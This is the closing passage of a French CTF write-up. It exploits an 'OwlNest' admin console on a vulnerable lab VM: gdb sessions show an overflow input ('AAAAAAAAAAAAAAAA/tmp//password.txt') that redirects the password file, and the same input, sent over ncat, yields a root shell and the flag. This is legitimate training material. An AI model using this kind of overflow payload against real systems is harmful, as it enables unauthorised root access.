(gdb) b *0x08048768
Breakpoint 2 at 0x8048768
(gdb) r
Starting program: /tmp/ctf/adminconsole 
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username toto

Breakpoint 2, 0x08048768 in main ()
(gdb) x/s $eax
0x80ce6c8:      "/root/password.txt"
(gdb) c
Continuing.
Ready: privs thisisdope

Breakpoint 1, 0x08056cba in strdup ()
(gdb) x/s $eax
0x80ce6b8:      "thisisdope\n"
(gdb) print 0x80ce6c8 - 0x80ce6b8
$1 = 16
```

On peut voir que le path du fichier est placé en mémoire derrière la valeur saisie par `privs` et qu'il y a 16 caractères qui séparent les deux.

Relançons mais en écrasant complétement le path et en plaçant un mot de passe de notre choix dans ce nouveau fichier :

```shellsession
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /tmp/ctf/adminconsole 
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username toto

Breakpoint 2, 0x08048768 in main ()
(gdb) c
Continuing.
Ready: privs AAAAAAAAAAAAAAAA/tmp//password.txt

Breakpoint 1, 0x08056cba in strdup ()
(gdb) x/s 0x80ce6c8
0x80ce6c8:      "/tmp//password.txt\n"
(gdb) !echo yolo > /tmp//password.txt
(gdb) c
Continuing.

Breakpoint 2, 0x08048768 in main ()
(gdb) c
Continuing.
Ready: password yolo

Breakpoint 2, 0x08048768 in main ()
(gdb) c
Continuing.
Ready: login

Breakpoint 2, 0x08048768 in main ()
(gdb) c
Continuing.
Access Granted!
Dropping into /bin/sh
[Detaching after fork from child process 6032]
sh-5.2$
```

Boum ! Ca fonctionne. On teste ça sur la VM en remote :

```shellsession
$ ncat 192.168.56.77 31337 -v
Ncat: Version 7.93 ( https://nmap.org/ncat )
Ncat: Connected to 192.168.56.77:31337.
        (\___/)   (\___/)   (\___/)   (\___/)   (\___/)   (\___/)
        /0\ /0\   /o\ /o\   /0\ /0\   /O\ /O\   /o\ /o\   /0\ /0\
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/
       /|:. .:|\ /|;, ,;|\ /|:. .:|\ /|;, ,;|\ /|;, ,;|\ /|:. .:|\
       \\:::::// \\;;;;;// \\:::::// \\;;;;;// \\;;;;;// \\::::://
   -----`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---`"" ""`---
        \__V__/   \__V__/   \__V__/   \__V__/   \__V__/   \__V__/

This is the OwlNest Administration console

Type Help for a list of available commands.

Ready: username plop 
Ready: privs AAAAAAAAAAAAAAAA/tmp//password.txt
Ready: password yolo
Ready: login
Access Granted!
Dropping into /bin/sh
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
flag.txt
password.txt
cat flag.txt
               \ `-._......_.-` /
                `.  '.    .'  .'        Oh Well, in the end you did it!
                 //  _`\/`_  \\         You stopped the olws' evil plan  
                ||  /\O||O/\  ||        By pwning their secret base you
                |\  \_/||\_/  /|        saved the world!
                \ '.   \/   .' /
                / ^ `'~  ~'`   \ 
               /  _-^_~ -^_ ~-  |
               | / ^_ -^_- ~_^\ |
               | |~_ ^- _-^_ -| |
               | \  ^-~_ ~-_^ / |
               \_/;-.,____,.-;\_/
        ==========(_(_(==)_)_)=========

The flag is: ea2e548590260e12030c2460f82c1cff8965cff1971107a9ecb3565b08c274f4

Hope you enjoyed this vulnerable VM.
Looking forward to see a writeup from you soon!
don't forget to ping me on twitter with your thoughts

Sincerely
@Swappage


PS: why the owls? oh well, I really don't know and yes: i really suck at fictioning :p
True story is that i was looking for some ASCII art to place in the puzzles and owls popped out first
```

Et c'est le but ! Plein d'éléments très spéciaux sur ce CTF assez compliqué mais intéressant.

*Publié le 18 décembre 2022*


